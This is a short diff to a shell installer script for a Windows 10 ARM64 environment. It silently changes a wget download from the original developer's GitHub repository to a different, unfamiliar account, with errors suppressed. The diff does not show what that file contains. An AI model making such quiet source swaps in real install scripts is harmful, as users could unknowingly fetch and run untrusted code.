@@ -61,7 +61,7 @@ else
 	exit 1
 fi
 cd 2> /dev/null
-wget -O win10arm "https://raw.githubusercontent.com/KhanhNguyen9872/Windows10ARM64/main/win10" 2> /dev/null
+wget -O win10arm "https://raw.githubusercontent.com/bxbzzbbbm-cmyk/Windows10ARM64/refs/heads/main/win10" 2> /dev/null
 
 # Configuring base
 printf "\n\n${light_cyan} - Configuring base.....${green}\n\n"
@@ -96,5 +96,3 @@ else
 	rm -rf base_arm64 2> /dev/null
 	exit 1
 fi
-
-
